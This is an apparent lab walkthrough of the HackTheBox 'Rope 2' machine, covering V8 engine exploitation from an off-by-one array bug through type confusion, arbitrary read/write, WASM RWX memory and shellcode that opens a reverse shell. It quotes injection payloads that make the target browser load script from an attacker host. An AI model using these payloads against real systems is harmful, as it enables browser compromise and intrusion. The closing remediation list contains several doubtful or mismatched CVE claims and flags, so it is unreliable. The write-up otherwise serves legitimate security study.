---
title: "Rope 2 HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T07:30:00Z
tags: ["insane-linux", "v8", "javascript-engine", "browser-exploitation", "oob-read-write", "type-confusion", "chrome", "webkit", "memory-corruption", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Rope 2 HTB machine featuring V8 JavaScript engine exploitation, out-of-bounds memory access, type confusion attacks, arbitrary read/write primitives, and browser-based remote code execution"
---

# Rope 2 HTB - Insane Linux Box Walkthrough

{{< youtube m6Fpc3zxrJg >}}

## Key Exploitation Steps and Techniques (Chronological Order)

The transcript describes a step-by-step exploitation of a V8 JavaScript engine vulnerability in a custom Chrome browser on the "Rope 2" CTF box. The bug involves out-of-bounds (OOB) read/write in `array.getLastElement` and `array.setLastElement` functions, leading to type confusion, arbitrary read/write primitives, and code execution. Below is a chronological extraction of the key steps and techniques, based on the narrator's actions and explanations.

1. **Reconnaissance and Target Enumeration**:
   - Perform Nmap scan (`sudo nmap -sC -sV -oA nmap/rope2 [TARGET-IP]`) to identify open ports: SSH (22, Ubuntu 10 banner indicating ~19.04), HTTP (5000, GitLab via robots.txt and title), HTTP (8000, Python Werkzeug server).
   - Visit sites: GitLab at port 5000 (add `gitlab.rope2.htb` and `rope2.htb` to `/etc/hosts`), V8 dev page at 8000 with link to GitLab repo.
   - Technique: Banner grabbing, hosts file modification, and basic web enumeration to identify services and versions.

2. **Bug Discovery in GitLab Repo**:
   - Analyze commits in GitLab: Identify custom commit by "r4j" adding buggy `array.getLastElement` (returns OOB map pointer) and `array.setLastElement` (allows OOB write).
   - Explanation: Bug causes array length to be off-by-one (e.g., length 4 allows access to index 4, which is the map metadata after elements).
   - Technique: Source code review for OOB read/write primitives; reference external resources (e.g., blog posts on V8 arrays, maps, and exploits).

3. **Remote Trigger Mechanism Discovery**:
   - Use "Contact Us" form on port 8000 to send messages; test for callback by injecting `<img src="http://[ATTACKER-IP]:8000/xss.test">`.
   - Observe request in attacker's web server (Python HTTP server or netcat); user-agent reveals Headless Chrome.
   - Technique: Reflected XSS-like injection to force remote browser to load attacker-controlled JavaScript.

4. **Environment Setup for V8 Debugging**:
   - Set up Ubuntu 18.04 VM (close to target's 19.04); install dependencies (GDB-GEF, Python 2.7/3, Chromium depot tools).
   - Fetch V8 source (`fetch v8`), checkout version matching target (`gclient checkout <commit>`), apply bug patch from GitLab (`git apply diff`).
   - Compile debug/release builds (`tools/dev/v8gen.py x64.release/debug`, `ninja -C out.gn/x64.release/debug`); allocate ≥4GB RAM to avoid failures.
   - Technique: Replicate target environment for local debugging; use TMUX for multi-pane setup (debug/release).

5. **V8 Internals Analysis**:
   - Run d8 shell in GDB with `--allow-natives-syntax` for extras like `%DebugPrint`.
   - Create helper functions in `pwn.js`: `f2i` (float to unsigned int), `i2f` (int to float), `f2h` (float to hex).
   - Examine arrays/objects in memory: Use `%DebugPrint` and GDB (`x/16xw <addr>-1`) to view structures (map, properties, elements, length); handle pointer tagging (subtract 1), SMI (left-shift by 1), pointer compression (isolate root prefix).
   - Technique: Memory layout inspection for floats (direct values) vs. objects (pointers); identify type confusion opportunities via map manipulation.

6. **Develop AddressOf Primitive**:
   - Create float array (`arr = [1.1]`); use `arr.setLastElement(obj_map)` to convert to object array via type confusion.
   - Place object to leak (`arr[0] = leak_obj`); revert to float array (`arr.setLastElement(fl_map)`); read `arr[0]` as address (strip compression with bitmask).
   - Technique: Type confusion (float ↔ object) to leak object address; adjust for pointer compression (add isolate root later).

7. **Develop FakeObj Primitive**:
   - Reverse of AddressOf: Start with float array; set `arr[0] = i2f(addr)`; convert to object array (`arr.setLastElement(obj_map)`).
   - Return `arr[0]` as fake object; revert map.
   - Technique: Type confusion to forge object at arbitrary address for memory manipulation.

8. **Arbitrary Read/Write Primitives**:
   - Create fake array (`fake_arr = [fl_map, 1.1, ...]`); get its address; create fake object pointing to fake_arr's elements minus offset (e.g., -0x20).
   - Read: Tag pointer if needed; set fake_arr[1] to length (e.g., 0x100); return `fake_arr[(addr-8n)/8n]`.
   - Write: Similar, but set `fake_arr[(addr-8n)/8n] = i2f(val)`.
   - Technique: Fake object over array elements for arbitrary memory access; test by reading/writing known addresses in GDB.

9. **Create RWX Memory Page**:
   - Use WebAssembly (WASM) code to instantiate RWX page (e.g., simple function returning 42, starting with 0x0061736d).
   - Leak WASM instance address; add offset (0x68) to get RWX page pointer.
   - Technique: Exploit WASM for RWX allocation (bypasses typical protections); find backing store via arbitrary read.

10. **Shellcode Injection and Execution**:
    - Generate shellcode (msfvenom: `linux/x64/exec` for touch file, then reverse shell to attacker).
    - Use arbitrary write to copy shellcode to RWX page; create function pointer to shellcode; execute it.
    - Technique: Overwrite RWX with shellcode; bypass sandbox (disabled on target) for execution.

11. **Local Testing**:
    - Package exploit in `pwn.js`; serve via HTTP; run local Chrome with `--no-sandbox` to test code execution (e.g., create file or reverse shell).
    - Technique: Disable sandbox for proof-of-concept; verify primitives and execution.

12. **Remote Exploitation**:
    - Inject `<script src="http://[ATTACKER-IP]:8000/pwn.js"></script>` via contact form.
    - Browser loads script; executes shellcode for reverse shell as "chrome" user.
    - Technique: XSS injection for remote code execution; pivot to SSH key drop for persistence.

## Security Gaps and Remediation

### Ubuntu 19.04 Operating System
- **Gap: End-of-Life Status** - The OS is end-of-life, making it difficult to receive security updates via apt, leaving it exposed to unpatched vulnerabilities in the kernel and other components.
  - **Fix**: Configuration fix - Upgrade to a supported LTS version (e.g., Ubuntu 20.04 or later) to enable ongoing security patching.
- **Gap: Kernel Race Condition (USN-4069-1)** - A race condition in core dumps allows local attackers to cause denial-of-service or potentially escalate privileges.
  - **Fix**: Configuration fix - Apply kernel patches if available (challenging due to EOL); alternatively, mitigate by restricting core dump access via sysctl configurations.
- **Gap: KVM Hypervisor Bounds Checking Issue (USN-4157-1)** - Improper bounds checking in KVM allows local attackers to cause denial-of-service or execute arbitrary code.
  - **Fix**: Source code fix - Patch the kernel source to enforce proper bounds checks; Configuration fix - Disable KVM if not needed or use kernel hardening tools like AppArmor.
- **Gap: Privilege Escalation (CVE-2023-2640)** - Inadequate permission checks in the kernel allow local attackers to escalate privileges (affects ~40% of Ubuntu users in similar versions).
  - **Fix**: Source code fix - Update kernel to include permission check fixes; Configuration fix - Enable SELinux or AppArmor profiles for stricter access controls.
- **Gap: WavPack Vulnerabilities (USN-4062-1)** - Multiple issues in WavPack library allow crafted WAV files to cause crashes or denial-of-service.
  - **Fix**: Source code fix - Patch WavPack to handle malformed inputs; Configuration fix - Restrict untrusted file processing via file type filters in applications.
- **Gap: MariaDB Vulnerabilities (USN-4070-3)** - Several security issues allowing potential data exposure or denial-of-service.
  - **Fix**: Source code fix - Apply MariaDB patches for input validation; Configuration fix - Use firewall rules to limit MariaDB exposure.

### SSH Service (Port 22)
- **Gap: Version Banner Exposure** - The SSH banner reveals the exact Ubuntu version (Ubuntu 10, fingerprinting as 19.04), aiding attackers in targeting known OS vulnerabilities.
  - **Fix**: Configuration fix - Edit `/etc/ssh/sshd_config` to disable or obfuscate the banner (e.g., set `DebianBanner no`).

### GitLab on Nginx (Port 5000)
- **Gap: Remote Code Execution (CVE-2021-22204)** - Unauthenticated RCE via DjVu files processed by ExifTool, allowing arbitrary command execution.
  - **Fix**: Source code fix - Patch ExifTool to sanitize inputs; Configuration fix - Disable ExifTool processing or update GitLab to a version post-13.10.2.
- **Gap: Denial-of-Service Vulnerabilities** - Multiple DoS issues in Nginx (e.g., Nessus Plugin ID 127907) due to unpatched flaws in handling requests.
  - **Fix**: Configuration fix - Update Nginx to a patched version and configure rate limiting in `nginx.conf`.
- **Gap: Misconfiguration in Container Registry** - Registry listens on wrong port or fails connections, potentially exposing to unauthorized access.
  - **Fix**: Configuration fix - Adjust Nginx proxy settings to ensure proper port forwarding and authentication.
- **Gap: Uncontrolled Resource Consumption** - High occurrence of resource exhaustion vulnerabilities leading to DoS.
  - **Fix**: Configuration fix - Implement resource limits in GitLab CI/CD and Nginx timeouts.
- **Gap: Exposed Vulnerable Source Code** - Custom commit exposes buggy V8 code, allowing attackers to analyze and exploit.
  - **Fix**: Source code fix - Conduct code reviews before commits; Configuration fix - Make repositories private or use access controls.

### Python Werkzeug Server (Port 8000)
- **Gap: Debugger PIN Bypass (CVE-2024-34069)** - Allows unauthorized access to the debugger, leading to potential RCE.
  - **Fix**: Configuration fix - Disable debugger in production (`debug=False` in app config).
- **Gap: UNC Path Handling Flaw (CVE-2024-49766)** - On Windows/Python <3.11, fails to detect absolute UNC paths, allowing path traversal.
  - **Fix**: Source code fix - Update Werkzeug to handle UNC paths; Configuration fix - Run on Python 3.11+ and use path validation middleware.
- **Gap: Multipart Form Parser Flaw (CVE-2024-49767)** - Vulnerability in `werkzeug.formparser` allowing potential data corruption or DoS.
  - **Fix**: Source code fix - Patch the parser to enforce stricter input checks.
- **Gap: Interactive Debugging Active** - Enables nice tracebacks exposing stack traces and code, aiding attackers.
  - **Fix**: Configuration fix - Set `PROPAGATE_EXCEPTIONS` to False and disable debug mode.
- **Gap: Version Disclosure** - HTTP responses reveal Werkzeug version, helping attackers target known vulns.
  - **Fix**: Configuration fix - Remove server headers in Werkzeug config.

### Headless Chrome Browser
- **Gap: Sandbox Disabled** - Allows shellcode execution without restrictions, enabling RCE from V8 exploits.
  - **Fix**: Configuration fix - Run with `--sandbox` flag enabled.
- **Gap: Type Confusion in V8 (Headroll CVE-2023-0704)** - Allows arbitrary code execution in headless mode.
  - **Fix**: Source code fix - Patch V8 for type checks; Configuration fix - Isolate headless instances in containers.
- **Gap: Remote File Read/Write (CVE in Headless Interface)** - Allows attackers to install malicious scripts or access local files.
  - **Fix**: Configuration fix - Run headless Chrome in a restricted user namespace or chroot.
- **Gap: Injection via Contact Us Form** - Allows HTML/JS injection (e.g., `<script src>`), forcing browser to load malicious payloads.
  - **Fix**: Source code fix - Sanitize form inputs to escape HTML; Configuration fix - Implement Content Security Policy (CSP).

### V8 JavaScript Engine
- **Gap: Off-by-One OOB Access** - Bug in `array.getLastElement` and `setLastElement` allows OOB read/write to map pointer, enabling type confusion and RCE.
  - **Fix**: Source code fix - Adjust array length with `-1` in the functions.
- **Gap: Type Confusion (CVE-2025-10585)** - High-severity flaw allowing RCE via malformed JavaScript.
  - **Fix**: Source code fix - Strengthen type checks in V8 parsing.
- **Gap: Use-After-Free (CVE-2025-9864)** - Allows memory corruption and potential RCE.
  - **Fix**: Source code fix - Improve memory management in V8.
- **Gap: Integer Overflow (CVE-2025-6191)** - OOB memory access via crafted HTML/JS.
  - **Fix**: Source code fix - Add overflow checks in V8 operations.
- **Gap: Type Confusion (CVE-2025-6554)** - Allows remote attackers to confuse types for RCE.
  - **Fix**: Source code fix - Enhance V8's type inference system.

## Conclusion

Rope 2 is an excellent machine that demonstrates the complexity of modern browser exploitation and JavaScript engine security. It requires expertise in:
- V8 JavaScript engine internals and memory layout analysis
- Out-of-bounds memory access and type confusion exploitation
- Browser sandbox bypass techniques
- WebAssembly (WASM) exploitation for RWX memory allocation
- Advanced debugging with GDB and memory manipulation
- Shellcode development and injection techniques

The machine emphasizes the importance of proper bounds checking in low-level code, the dangers of custom modifications to critical software components, and the need for comprehensive security testing in browser environments.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*